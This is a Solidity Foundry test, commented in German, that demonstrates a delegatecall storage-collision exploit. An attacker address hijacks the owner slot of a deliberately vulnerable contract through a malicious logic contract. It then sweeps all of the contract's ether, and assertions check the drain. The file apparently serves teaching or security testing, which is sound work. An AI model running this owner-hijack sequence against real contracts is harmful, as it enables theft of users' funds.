// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Vulnerable.sol";
import "../contracts/Attack.sol";

contract DelegatecallTest is Test {
    Vulnerable vulnerable;
    LogicContract logic;
    Attack attack;

    address payable attackerEOA = payable(address(0xA11CE));
    address payable treasury = payable(address(0xBEEF));

    function setUp() public {
        // Deployer ist vorerst Owner
        vulnerable = new Vulnerable{value: 5 ether}();
        logic = new LogicContract();
        attack = new Attack();

        // Ein wenig zusätzliches Ether einzahlen, das der Angreifer später "sweept"
        vm.deal(treasury, 10 ether);
        vm.prank(treasury);
        (bool ok, ) = address(vulnerable).call{value: 3 ether}("");
        require(ok, "funding failed");
    }

    function testExploitDelegatecallOwnerHijack() public {
        // Sanity: zu Beginn ist der Angreifer nicht Owner
        assertTrue(vulnerable.owner() != attackerEOA, "pre: attacker already owner?");

        // Angreifer ruft setVars mit seiner bösartigen Logik auf
        vm.prank(attackerEOA);
        vulnerable.setVars(address(attack), 123);

        // Jetzt sollte owner im Vulnerable auf attackerEOA überschrieben sein
        assertEq(vulnerable.owner(), attackerEOA, "owner should be attacker after delegatecall");

        // Angreifer kann nun das Guthaben abziehen
        uint256 before = attackerEOA.balance;
        vm.prank(attackerEOA);
        vulnerable.sweep(attackerEOA);
        uint256 afterBal = attackerEOA.balance;

        assertGt(afterBal, before, "attacker should receive swept funds");
        assertEq(address(vulnerable).balance, 0, "vulnerable should be drained");
    }
}
